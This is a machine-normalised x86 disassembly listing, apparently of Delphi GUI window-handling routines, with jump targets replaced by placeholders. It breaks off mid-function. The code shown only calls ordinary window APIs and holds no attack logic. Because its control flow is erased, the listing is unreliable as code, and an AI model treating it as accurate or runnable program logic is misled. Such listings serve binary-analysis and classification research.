mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44251a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43d180
sub_442534
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44255c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_453eac
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_453db4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403454
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44255c
test al al
jne r-xdata
sub_4425c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44255c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_444854
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4425f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44255c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_444854
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44261c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_442644
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_453eac
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_453db4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403454
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_442644
test al al
jne r-xdata
sub_4426ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442644
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4426cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442644
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44270c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_453eac
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403454
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44270c
test al al
jne r-xdata
sub_442770
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44270c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442790
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_440438
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43e0d4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_442790
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_442840
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_442790
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_453eac
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_43e0d4
test eax eax
jne r-xdata
sub_4428e8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441388
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442908
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441388
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44293c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441388
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44295c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_4429ac
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_4429d0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43c1ec
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_440438
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_4403fc
mov dl [ esp ]
mov si 0xffd1
call sub_403454
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_442a28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403454
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_442a4c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403454
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_442a84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43eba8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_440498
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_440ca8
sub_442abc
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403454
pop esi
pop ebx
retn
mov eax ebx
call sub_43d564
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404468
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404468
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_442b3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441088
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43ec7c
sub_442b9c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_440dfc
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_4401f8
pop ebx
retn
sub_442bcc
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_442bf4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_443a0c
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_4401f8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_442c64
push ebx
mov ebx eax
mov eax ebx
call sub_43eae8
mov eax ebx
call sub_443a0c
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_440498
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41ce2c
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_43e0d4
sub_442ca0
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43b7cc
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_443708
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_43e0d4
sub_442ce0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_443a0c
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_443708
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_442d20
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_440498
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_443a0c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_443610
sub_442d60
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_443848
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_443848
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_442dc0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_43db30
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_43ca64
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_440ff4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_442e30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ec20
mov edx esi
mov eax ebx
call sub_440458
pop esi
pop ebx
retn
sub_442e4c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_439e08
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_453eac
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403454
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403454
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403454
test al al
jne r-xdata
sub_442ee0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_444854
mov edx esi
mov eax ebx
call sub_442e4c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43e0d4
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_43e0d4
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43e0d4
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_453eac
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43e0d4
test eax eax
jne r-xdata
jmp r-xdata
sub_442fc4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_43e0d4
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_443018
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43e0d4
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_453eac
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43e0d4
test eax eax
jne r-xdata
sub_443064
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_442e4c
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43e0d4
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_453eac
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43e0d4
test eax eax
jne r-xdata
sub_4430c0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_453eac
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43e0d4
mov [ esi + 0xc ] eax
sub_4430f4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_443a0c
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_443a0c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43c574
mov eax ebx
mov si 0xffd0
call sub_403454
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43c8c0
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4431cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_440438
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_4403fc
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403454
inc edi
dec ebx
jne r-xdata
sub_443214
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ffa0
xor eax eax
push ebp
push sub_4432b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4431cc
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43cb3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4432b9
mov eax [ ebp - 0x4 ]
call sub_43ffa8
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_4432c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_440438
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_43ffc8
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_4403fc
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_4433b0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_413fa0
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_413e34
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_413fc0
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_413f44
call sub_443708
jmp r-xdata
mov eax ebp
mov edx esi
call sub_413f44
call sub_443708
sub_443488
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_4433b0
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_4434e8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_443708
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_443708
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
test eax eax
jne r-xdata
sub_44354c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443a0c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_43e0d4
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_42f548
call sub_42f628
test al al
je r-xdata
mov eax ebx
call sub_440438
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4403fc
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_4403fc
test [ eax + 0x52 ] 0x4
je r-xdata
sub_443610
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43c8c0
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_443648
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_453eac
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_443688
push ebx
mov ebx eax
mov eax ebx
call sub_453eac
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_457c18
pop ebx
retn
mov eax ebx
call sub_453ed4
mov eax ebx
call sub_443708
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_4436c0
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4436e4
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_4436e4
sub_44371c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
